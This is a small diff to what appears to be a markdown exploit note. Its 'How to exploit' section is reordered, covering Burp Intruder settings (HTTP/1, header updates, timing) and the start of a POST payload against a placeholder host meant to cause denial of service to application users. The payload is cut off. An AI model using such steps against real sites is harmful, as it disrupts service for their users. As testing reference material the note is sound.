@@ -13,11 +13,11 @@ Gain unauthorized access to sensitive data
 DoS aplication user with 404
 
 ## How to exploit
-1. Basic payload
-```
-#BurpIntruder to send every second and change version to HTTP/1, no header update
+Note: BurpIntruder then send request every second, change version to HTTP/1, and uncheck "no header update"
 Note: length is important for this attack
 
+1. Basic payload
+```
 #DoS
 POST / HTTP/1.1
 Host: www.vuln.com
